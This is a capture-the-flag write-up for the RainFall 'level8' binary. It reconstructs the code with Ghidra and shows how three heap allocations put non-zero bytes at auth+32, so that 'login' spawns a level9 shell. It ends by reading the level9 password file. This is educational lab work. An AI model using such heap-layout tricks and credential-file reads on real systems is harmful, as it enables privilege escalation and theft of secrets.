## Phase 1: Reconnaissance

We find a binary named `level8` in the home directory

The program repeatedly prints two pointers and waits for a command:

```console
level8@RainFall:~$ ./level8
(nil), (nil)
```

Testing the strings visible in the binary reveals four commands: `auth`, `reset`, `service`, and `login`

---

## Phase 2: Static Analysis

Using Ghidra, we recover the important control flow:

```c
char *auth;
char *service;

while (fgets(buffer, 128, stdin) != NULL)
{
    if (memcmp(buffer, "auth ", 5) == 0)
    {
        auth = malloc(4);
        *(int *)auth = 0;
        if (strlen(buffer + 5) <= 30)
            strcpy(auth, buffer + 5);
    }

    if (memcmp(buffer, "reset", 5) == 0)
        free(auth);

    if (memcmp(buffer, "service", 6) == 0)
        service = strdup(buffer + 7);

    if (memcmp(buffer, "login", 5) == 0)
    {
        if (*(int *)(auth + 32) != 0)
            system("/bin/sh");
        else
            fwrite("Password:\n", 1, 10, stdout);
    }
}
```

There are two separate memory-safety problems:

- `auth` is allocated with only 4 requested bytes, but `strcpy()` may copy as many as 30 bytes plus the terminating null byte
- `login` reads a 4-byte integer at `auth + 32`, outside the allocation

We do not need to corrupt a return address or function pointer. It is enough to make the out-of-bounds value at `auth + 32` non-zero

---

## Phase 3: Controlling the Out-of-Bounds Value

The goal is simple: `login` checks the 4 bytes located exactly 32 bytes after `auth`. We need to place any non-zero data at that location

### Step 1: Allocate `auth`

```console
auth test
0x804a008, (nil)
```

The first printed pointer tells us:

```text
auth = 0x0804a008
```

Therefore, the address checked by `login` is:

```text
auth + 32 = 0x0804a008 + 0x20 = 0x0804a028
```

We now know the destination: we need useful data to reach `0x0804a028`

### Step 2: Advance the Heap with `service`

On this 32-bit VM, each of these small allocations receives a minimum-size heap chunk. As a result, their returned addresses are 16 bytes apart even though `auth` requested only 4 bytes

The first `service` command allocates the next chunk:

```console
service test
0x804a008, 0x804a018
```

This service string is only 16 bytes after `auth`. We need an offset of 32 bytes, so we allocate one more:

```console
service test
0x804a008, 0x804a028
```

The three allocations are now arranged like this:

```text
auth
 |
 v
0x0804a008  [ auth data       ]
0x0804a018  [ service #1 data ]   auth + 16
0x0804a028  [ service #2 data ]   auth + 32  <- checked by login
```

The global `service` pointer is replaced by each command, but the first service allocation is not freed. This memory leak is why the second allocation is placed after it instead of reusing its address

### Step 3: Make the Check Succeed

The second service allocation begins with the characters `test`. `login` reads those first four bytes as an integer:

```text
memory at auth + 32:  74 65 73 74    ASCII: t e s t
integer value:        0x74736574      non-zero
```

The program does not care what the value represents. It only tests whether it is zero. Because the service string occupies `auth + 32`, the condition succeeds

---

## Phase 4: Exploitation

We create the `auth` chunk, allocate two service strings, and then request a login:

```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth test
0x804a008, (nil)
service test
0x804a008, 0x804a018
service test
0x804a008, 0x804a028
login
$ whoami
level9
```

`login` reads the first four bytes of the second service allocation through `auth + 32`. Because that value is non-zero, the binary calls `system("/bin/sh")` with level9 privileges

---

## Phase 5: Retrieving the Next Password

We read the password for level9:

```console
cat /home/user/level9/.pass
```

This reveals the flag for level9 and allows us to continue
